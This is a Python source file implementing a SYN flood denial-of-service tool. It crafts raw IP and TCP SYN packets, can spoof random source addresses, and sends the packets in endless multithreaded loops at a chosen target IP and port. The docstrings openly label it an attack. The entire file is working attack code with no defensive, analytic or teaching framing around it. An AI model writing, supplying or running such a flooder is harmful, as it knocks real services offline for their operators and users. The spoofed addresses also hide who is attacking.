import socket
import random
import threading

class SynFlood:
    def __init__(self, target_ip, target_port, spoof_ip=False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.spoof_ip = spoof_ip
        self.running = False
        self.threads = []

    def generate_random_ip(self):
        """Generate random IP for spoofing"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def syn_flood(self):
        """Send SYN packets to target"""
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while self.running:
            try:
                src_ip = self.generate_random_ip() if self.spoof_ip else socket.gethostbyname(socket.gethostname())
                src_port = random.randint(1024, 65535)
                
                # Craft TCP SYN packet
                packet = self.craft_syn_packet(src_ip, src_port)
                s.sendto(packet, (self.target_ip, self.target_port))
            except:
                pass

    def craft_syn_packet(self, src_ip, src_port):
        """Craft TCP SYN packet with raw sockets"""
        # IP header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40  # IP + TCP
        ip_id = random.randint(1,65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(self.target_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        ip_header = bytes([
            ip_ihl_ver, ip_tos, ip_tot_len >> 8, ip_tot_len & 0xFF,
            ip_id >> 8, ip_id & 0xFF, ip_frag_off >> 8, ip_frag_off & 0xFF,
            ip_ttl, ip_proto, ip_check >> 8, ip_check & 0xFF
        ]) + ip_saddr + ip_daddr
        
        # TCP header
        tcp_source = src_port
        tcp_dest = self.target_port
        tcp_seq = random.randint(0,4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4)
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = bytes([
            tcp_source >> 8, tcp_source & 0xFF, tcp_dest >> 8, tcp_dest & 0xFF,
            tcp_seq >> 24, (tcp_seq >> 16) & 0xFF, (tcp_seq >> 8) & 0xFF, tcp_seq & 0xFF,
            tcp_ack_seq >> 24, (tcp_ack_seq >> 16) & 0xFF, (tcp_ack_seq >> 8) & 0xFF, tcp_ack_seq & 0xFF,
            tcp_offset_res, tcp_flags, tcp_window >> 8, tcp_window & 0xFF,
            tcp_check >> 8, tcp_check & 0xFF, tcp_urg_ptr >> 8, tcp_urg_ptr & 0xFF
        ])
        
        # Pseudo header for checksum
        psh = bytes([
            ip_saddr[0], ip_saddr[1], ip_saddr[2], ip_saddr[3],
            ip_daddr[0], ip_daddr[1], ip_daddr[2], ip_daddr[3],
            0, ip_proto, len(tcp_header) >> 8, len(tcp_header) & 0xFF
        ]) + tcp_header
        
        # Calculate checksum
        tcp_check = self.checksum(psh)
        tcp_header = tcp_header[:16] + bytes([tcp_check >> 8, tcp_check & 0xFF]) + tcp_header[18:]
        
        return ip_header + tcp_header

    def checksum(self, data):
        """Calculate checksum for packet"""
        if len(data) % 2 != 0:
            data += b'\x00'
        
        res = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            res += w
        
        res = (res >> 16) + (res & 0xFFFF)
        res = ~res & 0xFFFF
        return res

    def start(self, threads=10):
        """Start SYN flood attack"""
        self.running = True
        for _ in range(threads):
            t = threading.Thread(target=self.syn_flood)
            t.daemon = True
            t.start()
            self.threads.append(t)

    def stop(self):
        """Stop SYN flood attack"""
        self.running = False
        for t in self.threads:
            t.join()
